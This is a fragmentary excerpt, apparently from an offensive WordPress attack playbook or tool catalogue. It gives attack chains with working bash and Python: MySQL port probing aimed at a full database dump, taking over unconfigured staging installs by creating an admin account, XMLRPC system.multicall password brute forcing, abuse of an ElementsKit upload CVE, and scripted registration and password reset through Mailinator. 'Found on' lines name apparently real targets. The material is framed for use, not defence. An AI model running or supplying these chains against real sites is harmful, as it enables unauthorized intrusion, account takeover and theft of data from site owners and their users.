...
- **`hunt-brute-force`** — Universal password spray pipeline (merged from password-spray-methodology) across all protocols + error code differentials
  fi
done
```
...
### Chain F: MySQL 3306 Open + Credentials → Data Breach
```
MySQL 3306 exposed on target -> Obtain credentials from source leaks (.env, wp-config backup, error log) ->
Connect to MySQL -> Dump user tables, posts, any custom tables -> Full database exfiltration
```

```bash
TARGET="$1"
echo "[*] Chain F: MySQL 3306 → brute/credential → full database dump"
MYSQL_OPEN=$(nmap -p 3306 --open -T4 "$TARGET" 2>/dev/null | grep -c "3306.*open")
if [[ "$MYSQL_OPEN" -gt 0 ]]; then
  echo "[+] MySQL 3306 OPEN"
  MYSQL_BANNER=$(timeout 5 nc -w 3 "$TARGET" 3306 </dev/null 2>/dev/null | head -1)
  [[ -n "$MYSQL_BANNER" ]] && echo "  Banner: $MYSQL_BANNER"
  echo "[*] Searching for credentials from source leaks, error logs, wp-config backups..."
else
  echo "[-] MySQL 3306 not open"
fi
```
**Found on:** target-health-saas.com (MySQL 8.0.46 exposed)

### Chain G: Staging install.php → Site Seizure
```
Staging subdomain found -> /wp-admin/install.php returns HTTP 200 ->
WordPress NOT configured -> Install your own admin account via curl POST ->
Full admin control of staging site -> Potential pivot to production (shared DB/internal network)
```
...
if [[ -z "$STAGING" ]]; then
  echo "Usage: $0 TARGET staging.TARGET"
  exit 0
fi
...
# Check setup-config.php (409 = wp-config exists confirmation — site is installed)
CONFIG_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$STAGING/wp-admin/setup-config.php")
[[ "$CONFIG_CODE" == "409" ]] && echo "  [INFO] setup-config.php HTTP 409 — wp-config.php EXISTS"
```
**Found on:** staging.retail-chain.com (install.php 200, setup-config.php 409)
...
## Subscriber & Role Pitfalls (Critical for RCE Chains)

- **Subscriber CANNOT upload via XMLRPC in modern WP (6.x).** `wp.uploadFile` and `metaWeblog.newMediaObject` both return "Sorry, you are not allowed to upload files." for subscriber role. Check `wp.getProfile` for `roles` array BEFORE trying upload.
- **Application Passwords shown to Subscriber but nonce rejected.** The `/wp-admin/profile.php` page contains the Application Passwords section for subscriber accounts, BUT the REST API endpoint returns `rest_cookie_invalid_nonce` (HTTP 403). The nonce is only valid for the subscriber's own session cookie — not for REST API calls.
- **Subscriber login stays on wp-login.php.** After POST to `/wp-login.php` with valid subscriber creds, the response is HTTP 200 with the login page again — no redirect to wp-admin. The session cookie IS set (`wordpress_logged_in_*` and `wordpress_sec_*`), but the subscriber role gets redirected back to login. Check the cookie jar, not the redirect URL. Use XMLRPC `wp.getUsersBlogs` as the most reliable auth check.
- **Mailinator flow: WordPress sends reset LINK, not password.** After registration, WordPress emails a reset link (`wp-login.php?action=rp&key=...&login=...`). You must: (1) fetch the reset page via Mailinator API to extract the key, (2) GET the reset page to get `wp-resetpass-*` cookie, (3) POST new password to `wp-login.php?action=resetpass`. The `rp_key` from the URL is required.
- **Subdirectory WP cookie issues.** WordPress in a subdirectory sets `wordpress_sec_*` cookies restricted to that path. Use XMLRPC for authenticated actions instead of cookie-based REST API.
- **`wp.editProfile` returning true ≠ role changed.** WordPress XMLRPC `wp.editProfile` returns `<boolean>1</boolean>` even when the role field is silently ignored. Always re-check via `wp.getProfile`.
- **Subscriber escalation paths (before RCE chain can proceed):**
  1. **Brute force admin via system.multicall** — 1000 passwords/request, check response for `isAdmin` or `blogName`.
  2. **ElementsKit CVE-2023-6853** — `admin-ajax.php` may accept `action=elementskit_upload_file` without capability check if nonce is known.
...
### Mailinator Password Reset Automation (Python)
...
s.post("https://TARGET/wp-login.php?action=register",
    data={"user_login": "testuser", "user_email": "testuser@mailinator.com",
          "wp-submit": "Register"})

# 2. Wait for email
time.sleep(4)
r = requests.get("https://api.mailinator.com/api/v2/domains/public/inboxes/testuser")

# 3. Extract reset link from email body
body = r.json().get("parts", [{}])[0].get("body", "")
...
s.post("https://TARGET/wp-login.php?action=rp",
    data={"pass1": "NewPass123!", "pass2": "NewPass123!",
          "rp_key": "extracted_key", "wp-submit": "Confirm New Password"})
```

**Pitfall:** The `rp_key` parameter is embedded in the email URL AND in the HTML form. Some WordPress versions auto-fill it, others require extracting from `r.text` using regex `name="rp_key"[^>]*value="([^"]+)"`.
...
---
- **`hunt-cors`** — Batch-probes multiple WP REST API endpoints for CORS credential reflection at scale. Chain primitive: manual CORS discovery → hunt-cors bulk-scan all sibling WP REST endpoints → full endpoint matrix.
